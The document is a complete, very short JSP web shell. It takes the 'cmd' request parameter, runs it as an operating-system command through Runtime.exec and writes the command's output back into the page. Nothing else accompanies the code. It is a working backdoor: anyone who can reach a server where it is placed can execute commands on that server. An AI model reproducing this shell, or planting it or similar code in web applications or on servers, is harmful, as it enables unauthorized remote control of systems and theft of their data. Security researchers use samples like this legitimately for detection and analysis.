<% if (request.getParameter("cmd") != null) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    java.io.InputStream in = p.getInputStream();
    int c;
    while ((c = in.read()) != -1) out.print((char)c);
} %>

